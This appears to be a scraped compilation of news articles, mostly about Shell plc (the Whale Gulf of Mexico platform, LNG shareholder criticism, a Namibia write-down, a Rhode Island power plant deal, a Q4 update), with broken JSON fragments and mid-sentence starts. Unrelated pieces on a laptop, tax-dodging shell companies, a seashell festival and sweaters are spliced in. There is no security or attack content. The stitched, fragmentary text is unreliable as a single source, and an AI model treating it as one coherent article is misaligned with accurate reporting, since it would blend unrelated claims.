Copilot+ to help you speed up the process of everyday tasks. But as AI slowly takes over the laptop space, this is becoming more common.\n\nWith a 65Wh battery you\u2019ll get a decent battery life out of this laptop. Acer states it\u2019ll run approximately 10.5 hours, allowing you to get through a work day and then some on a full charge.\n\nEarly verdict\n\nOverall the Acer Aspire Vero 16 is an amazing laptop, providing you with great performance at a low price point. As if that wasn\u2019t already good enough, you get a clean conscience as the casing is made from 70% recycled materials and is gorgeous.\n\nOne downside is the material feels quite cheap, but this can easily be looked past when you consider all of the other benefits which are on offer. It\u2019s somewhat frustrating that the regional pricing of this laptop makes it less affordable outside of the US and I hope Acer can adjust this prior to the laptop\u2019s release in April.",

            "content": "Posted by John Donovan: 11 Jan 25\n\nShell, the planet\u2019s favourite corporate villain, has done it again. This time, it\u2019s the launch of their latest ecological affront: the Whale floating facility in the Gulf of Mexico. With a name like Whale, you might think they were saving marine life. Nope. Instead, they\u2019re drilling for 100,000 barrels of oil equivalent per day while pretending this is just another day at the office. If there\u2019s one thing Shell excels at, it\u2019s making billions while destroying everything in its wake\u2014and they\u2019re bringing Chevron along for the ride\n\nA Whale-Sized Hypocrisy\n\nDiscovered in 2017, Whale was delayed for years because Shell decided to pinch pennies during the pandemic, calling it a \u201ccash preservation strategy.\u201d How noble. Now, with oil prices back on the rise and their corporate greed fully restored, they\u2019ve finally flipped the switch on a project holding 480 million barrels of recoverable oil equivalent. Chevron, the ever-eager sidekick, owns 40% of this mess and has gleefully announced Whale will help them reach 300,000 boepd in the Gulf of Mexico by 2026.\n\nBecause nothing screams \u201cforward-thinking energy strategy\u201d like doubling down on fossil fuels while the planet burns.\n\nShell\u2019s Gulf of Mexico Obsession\n\nShell, which already has 15 oil platforms in the Gulf and a hand in countless other projects, continues to invest heavily in the region. Why? Because U.S. oil fields offer one thing Shell loves: massive profits. While they\u2019re busy threatening to ditch the London Stock Exchange for a move to New York, this is just another reminder that their loyalty lies not with the planet, but with Wall Street.\n\nWho\u2019s Funding the Destruction?\n\nEnter BlackRock and Vanguard, Shell\u2019s largest shareholders and enablers-in-chief. These investment behemoths, managing trillions in assets, continue to pour money into Shell despite its relentless focus on fossil fuels and greenwashing. They\u2019ll gladly collect dividends while Whale churns out oil and Shell keeps pretending they\u2019re committed to a sustainable future.\n\nA Perfect Example of Shell\u2019s Priorities\n\nShell\u2019s investment in Whale underscores its unwavering dedication to two things: short-term profits and long-term environmental destruction.\n\n\u2022They\u2019ll tell you projects like Whale are critical to \u201cenergy security,\u201d but the truth is, they\u2019re just securing their balance sheets.\n\n\u2022They\u2019ll claim they\u2019re transitioning to a net-zero future while approving more oil platforms and scaling back renewables.\n\nLet\u2019s not forget CEO Wael Sawan, who has openly flirted with the idea of abandoning London for the U.S. stock market, where Shell\u2019s profit-over-planet strategy will likely be met with open arms. After all, why bother with pesky UK shareholders demanding accountability when you can revel in Wall Street\u2019s sin-stock culture?\n\nWhat the Actual F*ck, Shell?\n\nWhale is more than just an oil facility; it\u2019s a monument to everything wrong with Shell. While they rake in billions from fossil fuels, they continue to greenwash their operations, slash renewable investments, and threaten to abandon their UK roots. BlackRock, Vanguard, and the rest of their investor base will cheer from the sidelines, but the rest of us are left to deal with the fallout.\n\nSo here\u2019s to Shell, the ultimate sin stock, swimming deeper into fossil fuels while paying lip service to climate goals. As they dive into another billion-dollar project, the only thing bigger than Whale\u2019s production numbers is Shell\u2019s audacity. Bravo, Shell. You\u2019ve truly outdone yourself\u2014again.\n\nShare this: Facebook\n\nTwitter\n\nEmail\n\nPrint\n\n\n\nLike this: Like Loading...\n\nThis website and sisters royaldutchshellgroup.com johndonovan.website , and shellnews.net , are owned by John Donovan .

While Namibia has yet to produce any oil, Shell has said in a statement that the oil and gas resources discovered in offshore block PEL39 \u201ccannot currently be confirmed for commercial development,\u201d citing technical and geological difficulties encountered while developing offshore resources in the southern African country. All eyes were on Namibia when the breakthrough happened in February 2022, with major discoveries by Shell and TotalEnergies in the Graff and Venus blocks. This had generated significant global interest alongside a separate discovery by TotalEnergies in a nearby block.\n\nBut according to a recent assessment by the South Africa-based African Energy Chamber (AEC), Namibia \u201cstill offers substantial potential in the offshore Orange Basin, confirmed by major projects such as TotalEnergies\u2019 appraisal campaign in PEL 56.\u201d After all, other players, including Chevron, Woodside Energy, Galp and Rhino Resources continue to explore the southern African country\u2019s potential. Portuguese oil company Galp recently announced a notable discovery in a different offshore license, while Chevron said it was looking to make its discoveries in the country by 2025. While stakeholders deem Shell\u2019s $400 million write-down as a \u201cblow to the country,\u201d the AEC, which sees itself as serving as the voice of the African energy sector, considers \u201cthis merely a speed bump in Namibia\u2019s oil development rather than a road block\u201d on the long path to fully tap into the country\u2019s significant potential in the offshore Orange Basin and beyond.",

Last month, Shell reached final investment decision (FID) on a two-well subsea tieback from Silvertip to Perdido.\n\nThe Whale production semisubmersible in 8,600 ft water depth is largely a replicant of Shell\u2019s Vito platform, which started production in February 2023. Shell said Whale features energy-efficient gas turbines and compression systems that mean it will operate with around 30% lower greenhouse gas intensity over its life cycle than Vito.\n\nThe Vito platform, in about 4,000 ft water depth in the Mississippi Canyon area of the Gulf, represents the template for Shell\u2019s \u201cdesign one, build two\u201d model. The breakeven price for the minimal floater design for Vito was less than $35/bbl, according to Shell.\n\nHow do they differ? The red indicates the changes made to the Whale facility from the base Vito semisubmersible. The main changes included increased gas compression and helideck modifications. Source: Shell\n\nWhale replicates 99% of the hull design and 80% of the topsides from Vito, which reached FID in 2018. In announcing sanction for the 20,000-psi Sparta project in the Garden Banks area of the GOM in December 2023, Shell called its approach for Sparta an \u201cenhanced replication of Vito and Whale.\u201d The Sparta production semi, expected onstream in 2028, will replicate about 95% of Whale\u2019s hull and 85% of Whale\u2019s topsides.\n\nShell reached FID on Whale in July 2021, and Seatrium delivered the Whale production semi in October 2023. Whale is expected to produce 100,000 BOE/D at peak production with 15 wells tied back to the platform. Shell said Whale has an estimated recoverable resource volume of 480 million BOE.\n\nWhile Whale was originally expected to begin production by the end of 2024, it still went on-stream about 7 1/2 years after discovery. Shell noted the cycle time for Whale included a 1-year delay in the project reaching FID due to cash-preservation efforts during the COVID-19 pandemic.\n\nShell operates Whale with 60% interest on behalf of partner Chevron with 40% interest. Shell operates Vito with 63.11% interest on behalf of partner Equinor with 36.89% interest.

            "content": "lobally governments lose a staggering $492 billion a year to tax abuse according to recent research from the Tax Justice Network\u2014more than the GDP of Nigeria, Portugal, or Vietnam.\n\nThis money is vitally needed to fund public services, tackle inequality, and help drive sustainable economic growth. In Argentina, 53% of people live in poverty. At the same time, globally one\u2013quarter of taxes owed by the wealthiest 0.01% of the population are estimated to go unpaid, potentially costing governments as much as $200 billion.\n\nMultinational corporations and high net worth individuals use a variety of tools to avoid or evade tax. However, tax leaks like the Panama and Paradise Papers revealed how anonymously owned companies often play a pivotal role: tax evaders use \u2018shell\u2019 companies to hide their money from tax authorities, including by moving money through offshore jurisdictions with low transparency.\n\nTo help tackle this so far over 90 countries have set up registers of the real\u2014or beneficial\u2014owners of companies and other often opaque legal arrangements, helping keep track of who owns what and ensure they pay the tax that\u2019s due.\n\nGiving tax authorities access to company ownership information works. As a result of the Panama Papers leak\u2014which involved information about the clients of just one Panamanian offshore law firm, Mossack Fonseca\u2014governments around the world recovered over $1.2 billion in revenue within three years.\n\nHowever, these reforms aren\u2019t yet as impactful as they could be. Open Ownership interviewed nearly 50 government officials and other users of beneficial ownership registers from around the world. Government authorities reported cumbersome request processes to get information from other countries and painfully slow response times. In addition, data often isn\u2019t shared between countries in a standardized and easy to use way, while some tax authorities don\u2019t have the capacity, time, or expertise to connect the information that comes from abroad with their own datasets. All of these issues make it harder to identify the real owners.\n\nFrom our research and nearly a decade of experience helping governments implement beneficial ownership transparency reforms, we\u2019ve identified three key steps governments can take to help tackle the use of anonymously owned shell companies and clamp down on tax abuse. These cover both things governments can do unilaterally, and also where cooperation between countries is needed.\n\nData accuracy. Firstly, governments should collect accurate data on companies in their own country. Currently only around half of all countries globally have live beneficial ownership registers. Key economies like Switzerland, Australia, China, and Saudi Arabia are yet to implement them, which would help them to collect even more tax revenue.\n\nWhat\u2019s more, the data countries collect isn\u2019t always accurate. In the UK, people have registered companies under fake names like Santa Claus and Darth Vader. Governments should use new and existing technologies to check for missing or potentially inaccurate information, and take action to ensure the data is accurate.\n\nData sharing. Secondly, governments should share data with other countries. Tax abuse often happens across borders, but tax authorities face significant problems accessing and using beneficial ownership data from other jurisdictions. Just 9% of countries assessed are implementing beneficial ownership reforms effectively, according to the intergovernmental body that oversees global beneficial ownership transparency standards, the Financial Action Task Force (FATF).\n\nIn the short term, the FATF standards and OECD rules on exchanging information should be tightened to help other countries get the data they need. However, the FATF standards were designed to tackle money laundering rather than tax abuse more broadly, and both the FATF and OECD rules are shaped around the needs of high income countries. So in the longer\u2013term, countries should develop new rules that more effectively fight tax abuse through a process that gives developing countries an equal say, for example as part of the negotiations for a new UN tax agreement.\n\nData use. Finally, countries should use the data. This might sound like an obvious step, but all too often relevant parts of government can\u2019t access data when and in the format they need, and they don\u2019t have the resources to process and act on it. For example, tax authorities need to have the know\u2013how to match up data on domestic taxpayers with information about who owns foreign companies, and the resources to investigate potential irregularities.\n\nIntroducing or strengthening beneficial ownership reforms should be a no brainer for governments. Not only can these reforms help tackle tax abuse and raise much needed money for public services and other government priorities, but they can also help reduce corruption, fraud and other forms of criminal activity, building trust in businesses, democracies and across societies. With a few notable exceptions, most countries are heading in the right direction. However, reforms need to go much further and faster.",

This timeframe includes a one-year delay to the final investment decision following our cash preservation strategy during the COVID pandemic.\n\nThe estimated peak production and current estimated recoverable resources presented above are 100% total gross figures.\n\nThe estimate of resource volumes is currently classified as 2P under the Society of Petroleum Engineers' Resource Classification System.\n\nThe reference to our US Gulf of Mexico production being among the lowest GHG intensity in the world is a comparison among other IOGP oil- and gas-producing members.\n\nShell is the leading operator in the U.S. Gulf of Mexico .\n\nCautionary Note\n\nThe companies in which Shell plc directly and indirectly owns investments are separate legal entities.

All statements other than statements of historical fact are, or may be deemed to be, forward-looking statements. Forward-looking statements are statements of future expectations that are based on management's current expectations and assumptions and involve known and unknown risks and uncertainties that could cause actual results, performance or events to differ materially from those expressed or implied in these statements. Forward-looking statements include, among other things, statements concerning the potential exposure of Shell to market risks and statements expressing management's expectations, beliefs, estimates, forecasts, projections and assumptions. These forward-looking statements are identified by their use of terms and phrases such as \"aim\", \"ambition\", ''anticipate'', ''believe'', \"commit\", \"commitment\", ''could'', ''estimate'', ''expect'', ''goals'', ''intend'', ''may'', \"milestones\", ''objectives'', ''outlook'', ''plan'', ''probably'', ''project'', ''risks'', \"schedule\", ''seek'', ''should'', ''target'', ''will'', \"would\" and similar terms and phrases. There are a number of factors that could affect the future operations of Shell and could cause those results to differ materially from those expressed in the forward-looking statements included in this media release, including (without limitation): (a) price fluctuations in crude oil and natural gas; (b) changes in demand for Shell's products; (c) currency fluctuations; (d) drilling and production results; (e) reserves estimates; (f) loss of market share and industry competition; (g) environmental and physical risks; (h) risks associated with the identification of suitable potential acquisition properties and targets, and successful negotiation and completion of such transactions; (i) the risk of doing business in developing countries and countries subject to international sanctions; (j) legislative, judicial, fiscal and regulatory developments including regulatory measures addressing climate change; (k) economic and financial market conditions in various countries and regions; (l) political risks, including the risks of expropriation and renegotiation of the terms of contracts with governmental entities, delays or advancements in the approval of projects and delays in the reimbursement for shared costs; (m) risks associated with the impact of pandemics, such as the COVID-19 (coronavirus) outbreak, regional conflicts, such as the Russia-Ukraine war, and a significant cyber security breach; and (n) changes in trading conditions. No assurance is provided that future dividend payments will match or exceed previous dividend payments. All forward-looking statements contained in this media release are expressly qualified in their entirety by the cautionary statements contained or referred to in this section. Readers should not place undue reliance on forward-looking statements. Additional risk factors that may affect future results are contained in Shell plc's Form 20-F for the year ended December 31, 2023 (available at www.shell.com/investors/news-and-filings/sec-filings.html and www.sec.gov). These risk factors also expressly qualify all forward-looking statements contained in this media release and should be considered by the reader. Each forward-looking statement speaks only as of the date of this media release, 9 January 2025. Neither Shell plc nor any of its subsidiaries undertake any obligation to publicly update or revise any forward-looking statement as a result of new information, future events or other information. In light of these risks, results could differ materially from those stated, implied or inferred from the forward-looking statements contained in this media release.\n\nShell's net carbon intensity\n\nAlso, in this media release we may refer to Shell's \"Net Carbon Intensity\" (NCI), which includes Shell's carbon emissions from the production of our energy products, our suppliers' carbon emissions in supplying energy for that production and our customers' carbon emissions associated with their use of the energy products we sell. Shell's NCI also includes the emissions associated with the production and use of energy products produced by others which Shell purchases for resale. Shell only controls its own emissions. The use of the terms Shell's \"Net Carbon Intensity\" or NCI is for convenience only and not intended to suggest these emissions are those of Shell plc or its subsidiaries.\n\nShell's net-zero emissions target\n\nShell's operating plan, outlook and budgets are forecasted for a ten-year period and are updated every year. They reflect the current economic environment and what we can reasonably expect to see over the next ten years. Accordingly, they reflect our Scope 1, Scope 2 and Net Carbon Intensity (NCI) targets over the next ten years. However, Shell's operating plans cannot reflect our 2050 net-zero emissions target as this target is currently outside our planning period. In the future, as society moves towards net-zero emissions, we expect Shell's operating plans to reflect this movement. However, if society is not net zero in 2050, as of today, there would be significant risk that Shell may not meet this target.\n\nForward Looking non-GAAP measures\n\nThis media release may contain certain forward-looking non-GAAP measures such as EBITDA and divestments. We are unable to provide a reconciliation of these forward-looking non-GAAP measures to the most comparable GAAP financial measures because certain information needed to reconcile those non-GAAP measures to the most comparable GAAP financial measures is dependent on future events some of which are outside the control of Shell, such as oil and gas prices, interest rates and exchange rates. Moreover, estimating such GAAP measures with the required precision necessary to provide a meaningful reconciliation is extremely difficult and could not be accomplished without unreasonable effort. Non-GAAP measures in respect of future periods which cannot be reconciled to the most comparable GAAP financial measure are calculated in a manner which is consistent with the accounting policies applied in Shell plc's consolidated financial statements.\n\nThe contents of websites referred to in this media release do not form part of this media release.\n\nWe may have used certain terms, such as resources, in this media release that the United States Securities and Exchange Commission (SEC) strictly prohibits us from including in our filings with the SEC. Investors are urged to consider closely the disclosure in our Form 20-F, File No 1-32575, available on the SEC website www.sec.gov.\n\nSOURCE Shell Offshore Inc.",

Please let us know if you have feedback\n\nDive Brief:\n\nA group of Shell shareholders are calling out the oil giant on its plans to increase sales of liquified natural gas and asking the company to justify how its growth strategy is compatible with its climate goals, according to a shareholder resolution filed Tuesday.\n\nThe proposal was filed by U.K.-based investors Brunel Pension Partnership, Greater Manchester Pension Fund and Merseyside Pension Fund and co-filed by the Australasian Centre for Corporate Responsibility. This group of shareholders represents 0.25% of Shell\u2019s total shares, according to a Shell spokesperson. The proposal is also backed by over 100 independent shareholders represented by responsible investment nonprofit ShareAction .\n\nThe resolution asks Shell to disclose how it calculated the level of demand for LNG, as described in its 2024 LNG outlook , and how it \u201creconciles this demand with its broader strategy, including its climate commitments.\u201d The oil giant has a goal to become a net-zero emissions energy business by 2050 .\n\nDive Insight:\n\nThe shareholder resolution comes ahead of Shell\u2019s capital markets day and annual general meeting, scheduled for March and May 2025, respectively.\n\nLNG is expected to account for 30% of Shell\u2019s upstream hydrocarbon production in 2030, and the oil giant plans to expand its LNG business by around 20-30% by the end of the decade, compared to a 2022 baseline, according to its latest energy transition strategy report.\n\nInvestors backing the Jan. 7 resolution said Shell\u2019s forecasted LNG demand, as outlined in its most recent outlook, is higher than all scenarios published by the International Energy Agency. This includes the IEA\u2019s Net Zero Emissions by 2050 scenario \u2014 which Shell\u2019s outlook exceeds by 301% \u2014 and its Announced Pledges Scenario, which assumes that all climate goals are met but more are introduced \u2014 which the oil giant surpasses by 92%.\n\nThe proposal also states Shell\u2019s LNG demand outlook has \u201cnot been materially revised in response to major changes in the global energy market.\u201d\n\nA Shell spokesperson told ESG Dive Wednesday that the oil company\u2019s shareholders have \u201cstrongly backed our strategy to deliver more value with less emissions at successive AGMs, with the growing role of LNG at the heart of this strategy.\u201d\n\n\u201cWe are confident in the future role of LNG in our strategy, as we transform to become a net-zero emissions energy business by 2050,\u201d the spokesperson added.\n\nLast March, Shell rolled out an updated energy transition strategy that scaled back a 2030 carbon emissions reduction target and scrapped a goal to further reduce its carbon footprint by 2035. At the time, a Shell spokesperson told ESG Dive that the oil company\u2019s 2050 net-zero target \u201cremains at the heart of [its] strategy,\u201d and attributed Shell\u2019s decision to retire its initial climate goal to the \u201cuncertainty in the pace of change across many countries, and the broader energy transition.\u201d\n\nThe following May, the oil giant\u2019s shareholders approved this diluted climate strategy during the company\u2019s 2024 annual general meeting, rejecting a climate resolution put forward by shareholder activist group Follow This, which asked Shell to align its scope 3 emissions reductions targets with the Paris Agreement.\n\nThe new shareholder proposal also asks Shell for more transparency in relation to its LNG demand assumptions due to the \u201csignificant financial implications\u201d it holds for shareholders if these estimations don\u2019t materialize, and the negative climate implications if they do materialize.\n\nVaishnavi Ravishankar, Brunel Pension Partnership\u2019s head of stewardship, expressed concerns about the \u201capparent disconnect between Shell's LNG growth strategy and its stated climate targets and Paris-aligned pathway\u201d in a press release accompanying the proposal.\n\n\u201cWe need to see further transparency to assess Shell's alignment with climate goals, particularly in the context of the recent removal of its interim 2035 climate target.\u201d",

At peak, the development is expected to produce 100,000 barrels of oil equivalent per day (boe/d), and its current estimated recoverable resource volume is 480 million boe, Shell said.\n\nThe Whale semi-submersible production facility is approximately 200 miles southwest of Houston on Alaminos Canyon Block 773 in more than 8,600' of water. It\u2019s approximately 10 miles from the Shell-operated Perdido spar platform. Discovered in 2017, the Whale field will feature a total of 15 wells to be tied back to the host via subsea infrastructure in the first phase of development.\n\nThe Whale floating production unit, comprised of a topside module and a four-column semisubmersible floating hull, was built by Seatrium and transported to the U.S. aboard Boskalis' 902' semisubmersible heavy transport vessel Boka Vanguard in 2023.\n\nWhale replicates 99% of the hull design and 80% of the topsides from Vito, a four-column semi-submersible host facility located in the greater Mars Corridor that began production in early 2023. According to Shell, its strategy to leverage engineering and construction techniques used for Vito accelerated its production timeline. Whale was able to achieve first oil 7.5 years after discovery, including a delay in reaching a final investment decision due to Shell's cash preservation strategy adopted during the COVID-19 pandemic.\n\nIn addition, Whale features energy-efficient gas turbines and compression systems, which Shell said will reduce the facility's lifecycle greenhouse gas (GHG) intensity by about 30% compared to Vito.\n\n\"Whale demonstrates our focus on driving more value with less emissions from our Upstream business as we deliver the energy people need today,\" said Zo\u00eb Yujnovich, Shell's integrated gas and upstream director. \"It will make a significant contribution to our commitment to bring projects online, with a total peak production of more than 500,000 barrels of oil equivalent per day from 2023 through 2025.\"\n\nBruce Niemeyer, president, Chevron Americas exploration & production, said, \u201cProduction from Whale brings Chevron another step closer to reaching 300,000 net barrels of oil equivalent per day in the U.S. Gulf of Mexico by 2026.\u201d",

We have also hand-picked great vendors who are travelling here from across the country, Washington State to Texas, Maryland and beyond.\"\n\nOn display last year were exotic shells from the shores of Vanutu in the Southwestern Pacific, as well as from Hawaii, Australia, Panama, Mexico. An entire display was devoted to junonia, considered one of the rarest of Florida shells. They live at depths of 60 to 300 feet, so it takes a lot of wave action to get them up to the beach.\n\nHumans\u2019 love affair with seashells has been long and passionate, dating back to prehistory. In 2021, archeologists discovered the world\u2019s oldest jewelry, a set of 33 seashell beads estimated to be between 142,000 to 150,000 years old.\n\nSince those early years, we have continued our conchylomania, as 18th century Europeans labeled their passion for seashells. As with potato chips, we always crave one more. We collect seashells, we wear them, we display them and we eat their meaty contents whenever possible.\n\nThe Astronaut Trail Shell Club\u2019s Seashell Festival continues the long romance by paying homage to all things seashell.

Photo-Illustration: The Strategist; Photos: Retailers, Joe McKendry\n\n\u201cStrategist Brain\u201d is a series where staffers share the stores they\u2019ve stopped into, stuff they\u2019ve spotted, and extra tidbits from stories they\u2019ve worked on. You\u2019ll hear from a different writer every week.\n\nWe\u2019re now post-vacation, post-holidays, post-post-Christmas sales, and I\u2019m trying to do an informal little-to-no-buy this January. While austerity is not really my thing, I need to give my bank account (and my brain) a little time to recover from the monthlong spree I went on. Not that I won\u2019t be thinking about shopping, because I\u2019m going to take this time to consider and plan for this year\u2019s bigger purchases.\n\nIn the meantime, I\u2019ve really been enjoying the purchases I made since Black Friday, particularly my Baba\u00e0 sweaters. I usually buy a new one each year during the brand\u2019s Black Friday or winter sale, and this year (because I\u2019m mildly concerned about possible tariffs) I bought two, growing my collection of Spanish-made knitwear to five pieces. They had a bit of a moment over on TikTok, and if this cold snap is making you consider a purchase of your own, I have some answers to a few of the common questions I\u2019ve seen. On the itchiness question, I have only one response: It\u2019s wool, you\u2019ve gotta tell it. However, if you have really sensitive skin, don\u2019t sleep on its cotton sweaters. I reach for my cotton pullover maybe even more than I do my wool ones. Now, if you\u2019re considering a turtleneck, I actually prefer the No. 67 to the No. 17. At first, I was a little intimidated by the balloon-shape silhouette and oversize collar, but I find that I really like the drama it brings to my outfits. And, lastly, while the brand is known for its cropped-sleeve cardis, I prefer the full-sleeve versions of its knitwear. I\u2019m five-six, and I\u2019ve realized it\u2019s just slightly too cropped on my build, but do with that information what you will.\n\n[Editor\u2019s note: The \u201cnatural\u201d colorway of Baba\u00e0\u2019s No. 17 sweater is sold out, but it\u2019s available in the \u201carce\u201d colorway.]\n\nHere\u2019s everything else I\u2019ve seen recently \u2026\n\nBelgian Shoes Midinette Loafers $675 $675 Fellow Strategist writer Lauren Ro came into the office sporting a pair of Belgians, and this might be the push I need to finally pay a visit to its Manhattan showroom. Lauren scored them for a ridiculously low price on The RealReal, but I\u2019m not sure I\u2019ll get that lucky. And since my feet are quite wide, I really want to take advantage of the different widths it offers in-store. Yes, they are pricey, but I have bad feet \u2014 my podiatrist keeps telling me I need to wear better shoes \u2014 so the orthopedic-ish nature would allow me to justify the splurge. You know, for my health. $675 at Belgian Shoes Buy\n\nDavid Krys Martini Light $750 $750 This martini light has been my secondhand decor white whale for a long time, ever since I saw two of them at the Berriez showroom. And stories of people finding them for five bucks at Goodwill have haunted me. I had been so caught up in my eBay and Etsy hunts searching for a vintage one that \u2014 and I\u2019m embarrassed to admit this \u2014 I only very recently discovered that the designer, David Krys, still fabricates new ones. He drops them in limited quantities on his Etsy, and a new drop is nigh, so I\u2019m keeping my eye on his Instagram for the announcement. And the beauty of the brand-new lamps is that there isn\u2019t a cracked pimento light or scratched base in sight. $750 at Chairish Buy\n\nSimkhai Bridget Shell Clutch $495 I first saw this gilded oyster-shaped clutch at a fancy-schmancy boutique in Northport over the summer. And then I recently saw it again in a TikTok of a seriously stylish shopping addict. (Hot tip: Though they generally advise shopping less, reformed shopping addict content creators have the best taste. And you know they actually bought everything on their own dime.) I have a wedding in May this would be perfect for, but there are a ton of shell clutches like this one on Etsy and I\u2019m trying to decide if that would scratch this peculiar itch for a fifth of the price. $495 at Bloomingdale's Buy $495 at Bergdorf Goodman Buy\n\nMarissa Zappas Advent Calendar $100 $100 Speaking of Christmas gifts, my brother and his girlfriend got me this amazing (currently on-sale) Advent calendar from my favorite perfumer, Marissa Zappas. While I\u2019m generally over the Advent-calendar hype, fragrance-filled ones are still great in my opinion. It\u2019s been such a pleasure trying out a new sample each day and getting to sit and revisit each one as I plan my full-bottle purchase later this year. $100 at Marissa Zappas Buy\n\nTrove Trunk Midnight Navy $979 $979 I also checked out the new Trove showroom in the West Village, and its lacquer jewelry boxes are really something special. I\u2019m usually saving up for a new addition to my jewelry collection, but this visit made me think I should save up to have something to put my growing collection in. $979 at Trove Buy\n\nget the strategist newsletter Actually good deals, smart shopping advice, and exclusive discounts.

            "content": "The Federal Energy Regulatory Commission on Tuesday approved Shell Energy North America\u2019s planned purchase of a 596-MW, gas-fired combined-cycle power plant in Rhode Island.\n\nShell Energy North America, a subsidiary of Shell, expects to buy the Rhode Island State Energy Center in Johnston, Rhode Island, from investment funds managed by The Carlyle Group and from EGCO RISEC II, a subsidiary of Thailand-based Electricity Generating Public Co. Shell plans to close the deal this quarter.\n\nThe deal comes as ISO New England expects electricity use in its footprint to grow by 1.8% a year from 2024 to 2033, according to an annual 10-year forecast of capacity, energy, loads and transmission the grid operator released in May.\n\nShell buys electricity from the power plant under a tolling agreement that runs through this year, according to an application for the deal filed at FERC. The contract started in 2019, Shell said in an Oct. 22 press release announcing the deal.\n\n\u201cShell has had a successful integrated gas and power business in the growing ISO New England market for over 20 years, and this acquisition secures valuable trading opportunities by guaranteeing SENA\u2019s position in the market,\u201d Huibert Vigeveno, Shell downstream, renewables & energy solutions director, said in the release. \u201cOur strong understanding of this plant\u2019s performance positions Shell to capitalise on its value within our existing trading portfolio.\u201d\n\nThe power plant\u2019s capacity cleared ISO-NE\u2019s annual forward capacity auction for the current and upcoming delivery years and is committed to ISO-NE through May 31, 2028, except for a limited amount of excess winter capacity that may be offered into ISO-NE\u2019s monthly reconfigurations for the months of October through May, Shell and the power plant\u2019s owners told FERC.\n\nThe Rhode Island State Energy Center produced 3.6 million MWh in 2023, up from 3.3 million MWh the year before, according to the U.S. Energy Information Administration.\n\nShell also buys about 1,252 MW from unaffiliated third parties in ISO-NE\u2019s footprint under contracts that end on March 31, according to the application. This includes Shell buying 490 MW from Montville Power and 762 MW from Middletown Power in Connecticut. In New England, Shell is also affiliated with a company that owns a 25-MW solar farm in Litchfield, Connecticut, according to the application.\n\nShell and the power plant\u2019s owners said the transaction didn\u2019t pose competitive or market power concerns in ISO-NE\u2019s markets. FERC said the deal was \u201cconsistent\u201d with the public interest.\n\nEntergy Wholesale Commodities sold the Rhode Island State Energy Center to Carlyle Power Partners in December 2015 for a base price of about $490 million. The power plant has been operating since 2002, according to Shell.\n\nWhen EGCO Group bought its 49% stake in the Rhode Island State Energy Center in March 2023, the company said the power plant, located near the load centers of Boston and Providence, is a key facility for providing grid stabilizing and energy services. \u201cIt also serves as a potential base for future energy transition initiatives, including the preparation for co-located battery energy storage systems and co-firing of hydrogen as fuel in its combustion turbine units in the future,\u201d the company said.",

Managing Director Alastair Syme said in a note.\n\nImage Exxon Mobil said its Q4 profit took a $700 million hit from lower crude prices and narrowing profit margins. (Andrew Harrer/Bloomberg)\n\nIt\u2019s another indication of a fourth-quarter dip in earnings for the world\u2019s largest energy companies. Late on Jan. 7, Shell\u2019s largest rival Exxon Mobil Corp. said its profit for the period took a $700 million hit from lower crude prices and narrowing refining margins.\n\nIn the closing months of 2024, unexpected weakness in what is typically one of the strongest seasons for oil demand forced big players in the market to adjust, with the Organization of Petroleum Exporting Countries and its allies delaying the planned restart of some idle production. Brent crude futures have risen more than 3% so far this year, although many analysts see OPEC+ having little room to revive output with a supply glut looming.\n\nThe outlook for natural gas in the coming months is stronger, especially in Europe, where prices surged to a 14-month high after Russian gas flows through Ukraine halted following the expiration of a transit agreement.\n\nShell\u2019s natural gas production in the fourth quarter is seen at 880,000 to 920,000 barrels of oil equivalent a day, down from 941,000 a day in the third quarter due to maintenance at the Pearl Gas-to-Liquids plant in Qatar, according to a statement from the company. Gas liquefaction volumes are seen between 6.8 million and 7.2 million tons, down from 7.5 million in the prior period.\n\nWant more news? Listen to today's daily briefing above or go here for more info\n\n\u201cTrading and optimization results are expected to be significantly lower than the third quarter of 2024, driven by the non-cash impact of expiring hedging contracts\u201d for the fuel, Shell said.\n\nThese hedging contracts were related to Russia\u2019s invasion of Ukraine, when the London-based firm attempted to protect itself against supply shortages from one of the world\u2019s largest gas producing countries, according to the company.\n\nShell\u2019s update \u201clooks soft relative to current expectations,\u201d RBC Capital Markets Head of European Energy Research Biraj Borkhataria said in a note. \u201cWe expect the update to drive downgrades to consensus earnings expectations,\u201d but \u201cdo not expect weaker results to impact shareholder returns or the broader outlook.\u201d",

            "content": "Shell plc SHEL, the British energy major, has announced that it plans to increase the sales of liquefied natural gas (LNG). This decision has faced criticism from a group of major shareholders, who filed a resolution questioning whether the expansion of LNG sales aligns with the company\u2019s commitment to reduce carbon emissions related to its operations.\n\nShell's LNG Expansion Plans Under Scrutiny\n\nBeing the largest trader of LNG globally, Shell is banking on the anticipated rise in demand for the commodity in the upcoming years. However, the company is facing scrutiny from a major group of shareholders, including the Brunel Pension Partnership, Greater Manchester Pension Fund and Merseyside Pension Fund, for its decision to increase sales as it may conflict with the company\u2019s long-term climate targets.\n\nThe shareholders have asked for further clarification on how Shell\u2019s LNG growth strategy will remain consistent with the change in energy demand globally and with the company\u2019s plans to become a net zero energy firm by 2050. The pension funds that filed the resolution own combined assets, whose total value exceeds $86 billion.\n\nNatural gas is a cleaner burning fuel than coal and other fossil fuels. However, LNG emits a significant amount of greenhouse gases during the extraction and transportation process. As such, increasing LNG sales may hinder the company\u2019s ability to reach its net zero target by 2050.\n\nShell\u2019s LNG Demand Forecasts Exceed IEA Scenarios\n\nPer the investor group, Shell\u2019s projected LNG demand exceeds all the demand scenarios reported by the International Energy Agency (\u201cIEA\u201d). However, despite the inconsistency and the changes that the global energy market has undergone, the company has not substantially revised its demand projections.\n\nShell stated that LNG is expected to comprise approximately 30% of its hydrocarbon production in 2030. However, its demand forecasts are 301% higher than the \"Net Zero Emissions by 2050\" scenario presented by IEA.\n\nA representative of the Australasian Centre for Corporate Responsibility mentioned that the significantly high demand outlook presented by Shell raises governance questions regarding the implications of Shell\u2019s strategy and poses major financial risks for investors.\n\nAdditionally, Brunel Pension Partnership has raised its concerns about the inconsistency between Shell\u2019s climate goals and its LNG strategy. The spokesperson from Brunel Pension Partnership emphasized that Shell must provide greater transparency over the alignment toward its long-term climate commitments. The concerns regarding Shell\u2019s alignment toward its climate goals were the result of the company\u2019s recent decision to scrap carbon intensity from its operations by 2035.",

